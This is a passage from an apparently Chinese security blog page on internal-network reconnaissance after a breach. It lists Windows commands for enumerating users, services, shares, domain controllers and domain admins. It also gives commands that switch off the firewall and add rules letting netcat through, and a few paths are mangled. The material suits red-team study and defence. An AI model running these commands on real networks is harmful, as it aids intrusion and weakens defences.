+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/apache-log4j-rce/ class=menu__title>Apache_Log4j_RCE</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/%E8%BD%AF%E4%BB%B6%E4%BB%A3%E7%A0%81%E7%BC%BA%E9%99%B7%E6%A6%82%E8%BF%B0/ class=menu__title>软件代码缺陷概述</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/zerotrust/ class=menu__title>ZeroTrust</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E6%8A%93%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E9%87%8F/ class=menu__title>如何在mac上抓小程序的流量</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF/ class=menu__title>免杀思路</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/ class=menu__title>红蓝对抗</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/nsfocus2docx-md/ class=menu__title>Nsfocus2docx.md</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/landray-oa/ class=menu__title>Landray-OA 蓝凌OA custom.jsp页面任意文件读取</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/org-syntax/ class=menu__title>org-syntax</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/gopher-md/ class=menu__title>Gopher</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/ssrf/ class=menu__title>SSRF</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/chrome-0day-rce-no-sandbox/ class=menu__title>Chrome_0day_RCE_no_sandbox</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/telegram/ class=menu__title>Telegram</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/nginx/ class=menu__title>Nginx</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/win10%E7%B3%BB%E7%BB%9F%E4%BC%98%E5%8C%96/ class=menu__title>win10系统优化</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/xray-crawlergo/ class=menu__title>xray_crawlergo</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/java-basic/ class=menu__title>java-basic</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/gethttpproxy/ class=menu__title>getHttpProxy</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/ruijie-rg-uac/ class=menu__title>Ruijie_RG_UAC</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/code-of-principle/ class=menu__title>code_of_principle</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/kali-nethunter_and_andrax/ class=menu__title>kali_nethunter and Andrax</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/python-basic/ class=menu__title>python-basic</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/fastjson-rce/ class=menu__title>fastjson_rce</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/markdown-of-emacs/ class=menu__title>Markdown_of_Emacs</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/emacs/ class=menu__title>emacs</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/awk-sed-grep-find/ class=menu__title>awk-sed-grep-find</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/tar/ class=menu__title>TAR</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/shellshock/ class=menu__title>Shellshock</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/curl-wget/ class=menu__title>curl-wget</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/elasticsearch/ class=menu__title>Elasticsearch</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/sleep/ class=menu__title>sleep</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/ssltls%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E/ class=menu__title>SSLTLS相关漏洞</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/postgresql/ class=menu__title>PostgreSQL</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/css-basic/ class=menu__title>css_basic</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/html-basic/ class=menu__title>html_basic</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%A8%A1%E6%9D%BF/ class=menu__title>应急响应模板</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/graphite/ class=menu__title>Graphite</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/xenmobile/ class=menu__title>XenMobile</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/spacevim/ class=menu__title>SpaceVim</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/vim/ class=menu__title>VIM</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/program-concept/ class=menu__title>program_concept</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/kibana/ class=menu__title>Kibana</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/docker/ class=menu__title>Docker</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80%E7%AF%87/ class=menu__title>应急响应基础篇</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/nmap/ class=menu__title>Nmap</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E5%BF%B5/ class=menu__title>代码审计概念</a>
+</li>
+<li class=active>
+<a href=http://crkmythical.github.io/blog/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/ class="menu__title active">内网信息收集</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/tmux/ class=menu__title>Tmux</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/ipc-basic-operation/ class=menu__title>IPC Basic Operation</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/activemq/ class=menu__title>ActiveMQ</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/pythonic-tools/ class=menu__title>pythonic_tools</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/built-mr-frame-with-hexo-and-git/ class=menu__title>Built Mr.Frame with Hexo and Git</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/influxdb/ class=menu__title>InfluxDB</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/mongodb/ class=menu__title>MongoDB</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/redis/ class=menu__title>Redis</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/mysql/ class=menu__title>MySQL</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/memcache/ class=menu__title>Memcache</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/hadoop/ class=menu__title>Hadoop</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/zookeeper/ class=menu__title>Zookeeper</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/tomcat/ class=menu__title>Tomcat</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/supervisord/ class=menu__title>Supervisord</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/saltstack/ class=menu__title>SaltStack</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/nfs/ class=menu__title>NFS</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/harbor/ class=menu__title>Harbor</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/jdwp/ class=menu__title>JDWP</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/java-rmi/ class=menu__title>Java RMI</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/kali-inux%E7%B3%BB%E7%BB%9F%E4%BC%98%E5%8C%96/ class=menu__title>kali inux系统优化</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/markdown-syntax/ class=menu__title>Markdown Syntax Guide</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/rich-content/ class=menu__title>Rich Content</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/placeholder-text/ class=menu__title>Placeholder Text</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/emoji-support/ class=menu__title>Emoji Support</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/bash-basic/ class=menu__title>bash_basic</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/spring/ class=menu__title>Spring</a>
+</li>
+</ul>
+</div>
+<script>var menuTitle=document.querySelectorAll('.menu__title'),modal=document.getElementById("myModal"),drawer=document.getElementById('myDrawer'),closeDrawer=function(){setTimeout(function(){modal.style.opacity=0,drawer.style.left='-100%',modal.style.left='-100%'},250)};menuTitle?menuTitle.forEach(function(a){a.onclick=function(){closeDrawer(),localStorage.setItem('isDrawerOpen','false')}}):null</script>
+</div>
+</div>
+<div id=myModal class=modal></div>
+<script>var isDrawerOpen=localStorage.getItem('isDrawerOpen'),modal=document.getElementById("myModal"),drawer=document.getElementById('myDrawer'),languagedir=JSON.parse('"ltr"'),openDrawer=function(){modal.style.opacity=1,languagedir==="rtl"?(modal.style.right=0,drawer.style.right=0):(modal.style.left=0,drawer.style.left=0)};isDrawerOpen&&isDrawerOpen==='true'&&openDrawer()</script>
+<nav class=nav>
+<div class=navbar__wrapper data-bgimg=false>
+<div class=divider>
+<div class="navbar lmr">
+<div id=siteLogo class=navbar__logo--wrapper>
+<a href=/ title rel=home class=navbar__logo--link>
+<img src=/logo.png alt=Home class=navbar__logo>
+</a>
+<a href=/ title rel=home class=navbar__logo--text-link>
+<h6 class=navbar__logo--text data-bgimg=false>Mr.Frame</h6>
+</a>
+</div>
+<div class=navbar__menu--wrapper>
+<div id=tabletLogo class=hide>
+<a href=/ rel=home class=navbar__logo--link>
+<img src=/logo.png alt=Home class=navbar__logo>
+</a>
+</div>
+<div id=mobileLogo class=hide>
+<a href=# class=navbar__logo--link>
+<div class=navbar__icons--icon><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentcolor" d="M4 18h16c.55.0 1-.45 1-1s-.45-1-1-1H4c-.55.0-1 .45-1 1s.45 1 1 1zm0-5h16c.55.0 1-.45 1-1s-.45-1-1-1H4c-.55.0-1 .45-1 1s.45 1 1 1zM3 7c0 .55.45 1 1 1h16c.55.0 1-.45 1-1s-.45-1-1-1H4c-.55.0-1 .45-1 1z"/></svg>
+</div>
+</a>
+</div>
+<span id=navMenuMobile class=hide>
+<button id=navCollapseBtn class=navbar__dropdown--title aria-label="Section Menu" data-dir=ltr>
+blog<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24"><path fill="currentcolor" d="M8.12 9.29 12 13.17l3.88-3.88c.39-.39 1.02-.39 1.41.0s.39 1.02.0 1.41l-4.59 4.59c-.39.39-1.02.39-1.41.0L6.7 10.7c-.39-.39-.39-1.02.0-1.41.39-.38 1.03-.39 1.42.0z"/></svg>
+</button>
+<div class=navbar__collapse data-open=false>
+<ul>
+<li class=navbar__menu--mobile-item>
+<a href=/dso>DevSecOps</a>
+</li>
+<li class=navbar__menu--mobile-item>
+<a href=/red>redTeam</a>
+</li>
+<li class="navbar__menu--mobile-item active">
+<a href=/blog class=active>Blog</a>
+</li>
+</ul>
+</div>
+</span>
+<ul id=navMenu class=navbar__menu>
+<li class=navbar__menu--item>
+<a href=/dso data-bgimg=false>DevSecOps</a>
+</li>
+<li class=navbar__menu--item>
+<a href=/red data-bgimg=false>redTeam</a>
+</li>
+<li class="navbar__menu--item active">
+<a href=/blog data-bgimg=false>Blog</a>
+</li>
+</ul>
+</div>
+<div class=grow></div>
+<div id=siteSearch>
+<div class=search data-bgimg=false>
+<span class=icon><svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="currentcolor" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path d="M15.5 14h-.79l-.28-.27c1.2-1.4 1.82-3.31 1.48-5.34-.47-2.78-2.79-5-5.59-5.34-4.23-.52-7.79 3.04-7.27 7.27.34 2.8 2.56 5.12 5.34 5.59 2.03.34 3.94-.28 5.34-1.48l.27.28v.79l4.25 4.25c.41.41 1.08.41 1.49.0s.41-1.08.0-1.49L15.5 14zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
+</span>
+<input id=search aria-label="Site Search" class=input type=text autocomplete=off placeholder=Search>
+<div id=search-results class=dropdown>
+<div id=search-menu class=dropdown-menu>
+</div>
+</div>
+</div>
+</div>
+<div id=mobileSearch class=hide>
+<div id=mobileSearchBtn class=mobile-search__btn><svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="currentcolor" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path d="M15.5 14h-.79l-.28-.27c1.2-1.4 1.82-3.31 1.48-5.34-.47-2.78-2.79-5-5.59-5.34-4.23-.52-7.79 3.04-7.27 7.27.34 2.8 2.56 5.12 5.34 5.59 2.03.34 3.94-.28 5.34-1.48l.27.28v.79l4.25 4.25c.41.41 1.08.41 1.49.0s.41-1.08.0-1.49L15.5 14zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
+</div>
+<div id=search-mobile-container class="mobile-search hide">
+<div class=mobile-search__top>
+<input id=search-mobile type=text aria-label="Mobile Search" placeholder=Search... class=mobile-search__top--input>
+<div id=search-mobile-close class=mobile-search__top--icon><svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24"><path opacity=".87" fill="none" d="M0 0h24v24H0V0z"/><path fill="currentcolor" d="M12 2C6.47 2 2 6.47 2 12s4.47 10 10 10 10-4.47 10-10S17.53 2 12 2zm0 18c-4.41.0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm3.59-13L12 10.59 8.41 7 7 8.41 10.59 12 7 15.59 8.41 17 12 13.41 15.59 17 17 15.59 13.41 12 17 8.41z"/></svg>
+</div>
+</div>
+<div id=search-mobile-results class=mobile-search__body>
+</div>
+</div>
+</div>
+<div class=navbar__icons>
+<div class=dropdown>
+<button class="lang__dropdown navbar__icons--icon" aria-label="Select Site Language"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentcolor" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path d="M12.65 15.67c.14-.36.05-.77-.23-1.05l-2.09-2.06.03-.03c1.74-1.94 2.98-4.17 3.71-6.53h1.94c.54.0.99-.45.99-.99v-.02c0-.54-.45-.99-.99-.99H10V3c0-.55-.45-1-1-1s-1 .45-1 1v1H1.99c-.54.0-.99.45-.99.99.0.55.45.99.99.99h10.18C11.5 7.92 10.44 9.75 9 11.35c-.81-.89-1.49-1.86-2.06-2.88-.16-.29-.45-.47-.78-.47-.69.0-1.13.75-.79 1.35.63 1.13 1.4 2.21 2.3 3.21L3.3 16.87c-.4.39-.4 1.03.0 1.42.39.39 1.02.39 1.42.0L9 14l2.02 2.02c.51.51 1.38.32 1.63-.35zM17.5 10c-.6.0-1.14.37-1.35.94l-3.67 9.8c-.24.61.22 1.26.87 1.26.39.0.74-.24.88-.61l.89-2.39h4.75l.9 2.39c.14.36.49.61.88.61.65.0 1.11-.65.88-1.26l-3.67-9.8c-.22-.57-.76-.94-1.36-.94zm-1.62 7 1.62-4.33L19.12 17h-3.24z"/></svg>
+</button>
+<div class="dropdown-content lang__dropdown--content">
+<a href=http://crkmythical.github.io/blog/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/ data-lang=en class="lang__dropdown--item active">English</a>
+</div>
+</div>
+<button id=toggleToDark class=navbar__icons--icon aria-label="Toggle to dark mode"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path fill="currentcolor" d="M20 15.31 23.31 12 20 8.69V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69zM12 18c-3.31.0-6-2.69-6-6s2.69-6 6-6 6 2.69 6 6-2.69 6-6 6z"/></svg>
+</button>
+<button id=toggleToLight class=navbar__icons--icon aria-label="Toggle to light mode"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path fill="currentcolor" d="M20 8.69V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69zM12 18c-3.31.0-6-2.69-6-6s2.69-6 6-6 6 2.69 6 6-2.69 6-6 6zm0-10c-2.21.0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4-1.79-4-4-4z"/></svg>
+</button>
+<script>var theme=localStorage.getItem('theme'),toggleToLightBtn=document.getElementById('toggleToLight'),toggleToDarkBtn=document.getElementById('toggleToDark');theme&&theme==='dark'?(toggleToLightBtn.className='navbar__icons--icon',toggleToDarkBtn.className='hide'):(toggleToLightBtn.className='hide',toggleToDarkBtn.className='navbar__icons--icon')</script>
+<div class=navbar__icons--icon>
+<a href=https://crkmythical.github.io title="Github repository" aria-label="Github repository" target=_blank rel=noreferrer><svg fill="currentcolor" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="22" height="22"><path d="M10.9 2.1c-4.6.5-8.3 4.2-8.8 8.7-.5 4.7 2.2 8.9 6.3 10.5C8.7 21.4 9 21.2 9 20.8v-1.6s-.4.1-.9.1c-1.4.0-2-1.2-2.1-1.9-.1-.4-.3-.7-.6-1C5.1 16.3 5 16.3 5 16.2 5 16 5.3 16 5.4 16c.6.0 1.1.7 1.3 1 .5.8 1.1 1 1.4 1 .4.0.7-.1.9-.2.1-.7.4-1.4 1-1.8-2.3-.5-4-1.8-4-4 0-1.1.5-2.2 1.2-3C7.1 8.8 7 8.3 7 7.6c0-.4.0-.9.2-1.3.0-.2.2-.3.3-.3h.1C8.1 6.1 9.1 6.4 10 7.3c.6-.2 1.3-.3 2-.3s1.4.1 2 .3c.9-.9 2-1.2 2.5-1.3h.1c.2.0.3.1.4.3.0.4.0.9.0 1.3.0.8-.1 1.2-.2 1.4.7.8 1.2 1.8 1.2 3 0 2.2-1.7 3.5-4 4 .6.5 1 1.4 1 2.3v2.6c0 .3.3.6.7.5 3.7-1.5 6.3-5.1 6.3-9.3.0-6-5.1-10.7-11.1-10z"/></svg>
+</a>
+</div>
+</div>
+</div>
+</div>
+</div>
+</nav>
+<script>var siteLogo=document.getElementById('siteLogo'),tabletLogo=document.getElementById('tabletLogo'),mobileLogo=document.getElementById('mobileLogo'),navMenu=document.getElementById('navMenu'),navMenuMobile=document.getElementById('navMenuMobile'),siteSearch=document.getElementById('siteSearch'),mobileSearch=document.getElementById('mobileSearch');enquire.register("screen and (max-width:1280px)",{match:function(){siteLogo.className='navbar__logo--wrapper',tabletLogo.className='hide',mobileLogo.className='hide',navMenu.className='navbar__menu',navMenuMobile.className='hide',siteSearch.className='',mobileSearch.className='hide'},unmatch:function(){siteLogo.className='navbar__logo--wrapper',tabletLogo.className='hide',mobileLogo.className='hide',navMenu.className='navbar__menu',navMenuMobile.className='hide',siteSearch.className='',mobileSearch.className='hide'}}).register("screen and (max-width:960px)",{match:function(){siteLogo.className='hide',tabletLogo.className='',mobileLogo.className='hide',navMenu.className='navbar__menu',navMenuMobile.className='hide',siteSearch.className='hide',mobileSearch.className='navbar__icons--icon'},unmatch:function(){siteLogo.className='navbar__logo--wrapper',tabletLogo.className='hide',mobileLogo.className='hide',navMenu.className='navbar__menu',navMenuMobile.className='hide',siteSearch.className='',mobileSearch.className='hide'}}).register("screen and (max-width:600px)",{match:function(){siteLogo.className='hide',tabletLogo.className='hide',mobileLogo.className='',navMenu.className='hide',navMenuMobile.className='',siteSearch.className='hide',mobileSearch.className='navbar__icons--icon'},unmatch:function(){siteLogo.className='hide',tabletLogo.className='',mobileLogo.className='hide',navMenu.className='navbar__menu',navMenuMobile.className='hide',siteSearch.className='hide',mobileSearch.className='navbar__icons--icon'}})</script>
+<div class=mid>
+<div class=divider>
+<nav id=single-menu class=l data-dir=ltr>
+</nav>
+<article id=list-main class=m data-dir=ltr>
+<nav class=breadcrumb aria-label=breadcrumbs data-is-blog=true>
+<ol>
+<li>
+<a href=http://crkmythical.github.io/ class=capitalize>Z Themes</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/ class=capitalize>Blog</a>
+</li>
+<li class=is-active>
+<span>内网信息收集</span>
+</li>
+</ol>
+</nav>
+<div class=single data-display=block>
+<div class=single__title>
+内网信息收集
+</div>
+<div class=single__meta>
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16" fill="currentcolor"><path d="M4 4H20V8H4z" opacity=".3"/><path d="M6 1H8V5H6zM16 1h2V5H16z"/><path d="M19 3H5C3.9 3 3 3.9 3 5v14c0 1.1.9 2 2 2h14c1.1.0 2-.9 2-2V5C21 3.9 20.1 3 19 3zm0 16H5V9h14V19zM19 7H5V5h14V7z"/></svg><time title="Written At">Dec 7, 2020 </time> &nbsp;&nbsp;<svg fill="#000" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16"><path fill="currentcolor" d="M9 1V3h6V1H9zm9.958984 1.7929688-1.292968 1.5253906 2.949218 2.5 1.292969-1.5253906-2.949219-2.5zM12 4C7.0225467 4 3 8.0225467 3 13c0 4.977453 4.0225467 9 9 9 4.977453.0 9-4.022547 9-9 0-4.9774533-4.022547-9-9-9zm0 2c3.910547.0 7 3.0894533 7 7 0 3.910547-3.089453 7-7 7-3.9105467.0-7-3.089453-7-7 0-3.9105467 3.0894533-7 7-7zM11 8v6h2V8H11z"/></svg> <span title="Reading Time"> 7 min read</span>
+</div>
+<article class=single__contents data-dir=ltr>
+<h2 id=11-本机信息>1.1. 本机信息</h2>
+<h3 id=111-手动收集>1.1.1. 手动收集</h3>
+<h4 id=1111-用户列表管理员-net-user--net-localgroup-administrators>1.1.1.1. 用户列表/管理员 <code>net user | net localgroup administrators</code></h4>
+<p>当前在线用户 <code>query user</code></p>
+<h4 id=1112-网络配置----ipconfig-all>1.1.1.2. 网络配置 <code>ipconfig /all</code></h4>
+<h4 id=1113-操作系统及补丁-wmic-qfe-list-brieftmptxt>1.1.1.3. 操作系统及补丁 <code>wmic qfe list brief>tmp.txt</code></h4>
+<p>当前系统信息 <code>systeminfo | findstr "OS KB"</code></p>
+<h4 id=1114-系统架构-echo-processor_architecture>1.1.1.4. 系统架构 <code>echo %processor_architecture%</code></h4>
+<h4 id=1115-本机服务信息-wmic-service-list-brieftmptxt>1.1.1.5. 本机服务信息 <code>wmic service list brief>tmp.txt</code></h4>
+<h4 id=1116-安装软件-wmic-product-get-nameversioninstalllocation-tmptxt>1.1.1.6. 安装软件 <code>wmic product get name,version,installlocation >tmp.txt</code></h4>
+<p>利用PowerShell收集软件<br>
+<code>"Get-WmiObject -Class win32_product | Select-Object -Property name,version,installlocation"</code></p>
+<h4 id=1117-端口列表-netstat--ano>1.1.1.7. 端口列表 <code>netstat -ano</code></h4>
+<h4 id=1118-进程列表-wmic-process-list-brieftmptxt>1.1.1.8. 进程列表 <code>wmic process list brief>tmp.txt</code></h4>
+<p>当前进程信息<code>tasklist</code></p>
+<h4 id=1119-开机自动程序-wmic-startup-list-brief-tmptxt>1.1.1.9. 开机自动程序 <code>wmic startup list brief >tmp.txt</code></h4>
+<h4 id=11110-计划任务-schtasks-query-fo-table-v-tmptxt>1.1.1.10. 计划任务 <code>schtasks /query /fo table /v >tmp.txt</code></h4>
+<h4 id=11111-本地计算机和所连接客户端之间会话-net-session>1.1.1.11. 本地计算机和所连接客户端之间会话 <code>net session</code></h4>
+<h4 id=11112-本机共享列表-wmic-share-get-namepathstatus-tmptxt>1.1.1.12. 本机共享列表 <code>wmic share get name,path,status >tmp.txt</code></h4>
+<p>共享列表 <code>net share </code></p>
+<h4 id=11113-路由表arp缓存表-route-print--arp--a>1.1.1.13. 路由表/ARP缓存表 <code>route print | arp -a</code></h4>
+<h4 id=11114-防火墙相关配置>1.1.1.14. 防火墙相关配置</h4>
+<h5 id=111141-查看防火墙配置-netsh-firewall-show-config>1.1.1.14.1. 查看防火墙配置 <code>netsh firewall show config</code></h5>
+<h5 id=111142-关闭防火墙-netsh-advfirewall-set-allprofiles-state-off>1.1.1.14.2. 关闭防火墙 <code>netsh advfirewall set allprofiles state off</code></h5>
+<p>win2003之前版本 <code>netsh firewall set opmode disable</code></p>
+<h5 id=111143-修改防火墙配置>1.1.1.14.3. 修改防火墙配置</h5>
+<ul>
+<li>
+<p>允许指定程序进入<br>
+<code>netsh advfirewall firewall add rule name="pass nc" dir=in action=allow program="C: c.exe"</code></p>
+</li>
+<li>
+<p>允许指定程序外出<br>
+<code>netsh advfirewall firewall add rule name="allow nc" dir=out action=allow program="C: c.exe"</code></p>
+</li>
+<li>
+<p>允许3389端口放行<br>
+<code>netsh advfirewall firewall add rule name="remote desktop" protocol=TCP dir=in localport=3389 action=allow</code></p>
+<blockquote>
+<p>netsh firewall add allowedprogram c:<br>
+c.exe &ldquo;allow nc&rdquo; enable #win2003之前版本</p>
+</blockquote>
+</li>
+</ul>
+<h5 id=111144-更改防火墙日志文件存储>1.1.1.14.4. 更改防火墙日志文件存储</h5>
+<p><code>netsh advfirewall set currentprofile logging filename "C:\windows\temp\fw.log"</code></p>
+<h4 id=11115-代理配置-reg-query-hkey_current_usersoftwaremicrosoftwindowscurrentversioninternet-settings>1.1.1.15. 代理配置 <code>reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"</code></h4>
+<h4 id=11116-开启rdp服务>1.1.1.16. 开启RDP服务</h4>
+<ul>
+<li>查询<br>
+<code>reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /V PortNumber</code></li>
+</ul>
+<h3 id=112-自动收集>1.1.2. 自动收集</h3>
+<h4 id=1121-wmicwwwfuzzysecuritycomscriptsfileswmic_inforar信息收集>1.1.2.1. <a href=/www.fuzzysecurity.com/scripts/files/wmic_info.rar>wmic</a>信息收集</h4>
+<h4 id=1122-empirehttpsgithubcombc-securityempiregit信息收集>1.1.2.2. <a href=https://github.com/BC-SECURITY/Empire.git target=_blank>Empire</a>信息收集</h4>
+<h2 id=12-判断域环境>1.2. 判断域环境</h2>
+<h3 id=121-是否存在域-systeminfo--findstr->1.2.1. 是否存在域 <code>systeminfo | findstr "\."</code></h3>
+<h3 id=122-dns与本机是否网段-ipconfig-all>1.2.2. DNS与本机是否网段 <code>ipconfig /all</code></h3>
+<h3 id=123-dns与域是否同ip-nslookup-hackertestlab>1.2.3. DNS与域是否同IP <code>nslookup hacker.testlab</code></h3>
+<h3 id=124-当前登录域及登录用户信息-net-config-workstation>1.2.4. 当前登录域及登录用户信息 <code>net config workstation</code></h3>
+<h3 id=125-判段主域-net-time-domain>1.2.5. 判段主域 <code>net time /domain</code></h3>
+<h3 id=126-获取域sid-whoami-all>1.2.6. 获取域SID <code>whoami /all</code></h3>
+<h3 id=127-指定域用户详细信息-net-user-xxx-domain>1.2.7. 指定域用户详细信息 <code>net user xxx /domain</code></h3>
+<h2 id=13-搜集域内基础信息>1.3. 搜集域内基础信息</h2>
+<h3 id=131-查询域-net-view-domain>1.3.1. 查询域 <code>net view /domain</code></h3>
+<h3 id=132-查询域内所有主机-net-view-domainhacker>1.3.2. 查询域内所有主机 <code>net view /domain:hacker</code></h3>
+<h3 id=133-查询域内所有用户组列表-net-group-domain>1.3.3. 查询域内所有用户组列表 <code>net group /domain</code></h3>
+<h3 id=134-查询域内成员计算机列表-net-gorup-domain-computers-domain->1.3.4. 查询域内成员计算机列表 <code>net gorup "domain computers" /domain </code></h3>
+<h3 id=135-获取域密码信息-net-accounts-domain->1.3.5. 获取域密码信息 <code>net accounts /domain </code></h3>
+<h3 id=136-获取域信任信息-nltest-domain_trusts>1.3.6. 获取域信任信息 <code>nltest /domain_trusts</code></h3>
+<h2 id=14-查找域控制器>1.4. 查找域控制器</h2>
+<h3 id=141-dc组-net-group-domain-controllers-domain>1.4.1. DC组 <code>net group "domain controllers" /domain</code></h3>
+<h3 id=142-dc机器名-nltest-dclisthacker>1.4.2. DC机器名 <code>nltest /dclist:hacker</code></h3>
+<h3 id=143-dc主机名-nslookup--typesrv-_ldap_tcp>1.4.3. DC主机名 <code>nslookup -type=srv _ldap._tcp</code></h3>
+<h3 id=144-主域dc-netdom-query-pdc>1.4.4. 主域DC <code>netdom query pdc</code></h3>
+<h2 id=15-获取域内用户和管理员信息>1.5. 获取域内用户和管理员信息</h2>
+<h3 id=151-域内用户列表-net-user-domain>1.5.1. 域内用户列表 <code>net user /domain</code></h3>
+<h3 id=152-域管理员用户-net-group-domain-admins-domain->1.5.2. 域管理员用户 <code>net group "domain admins" /domain </code></h3>
+<p><code>net group "enterprise admins" /domain</code></p>
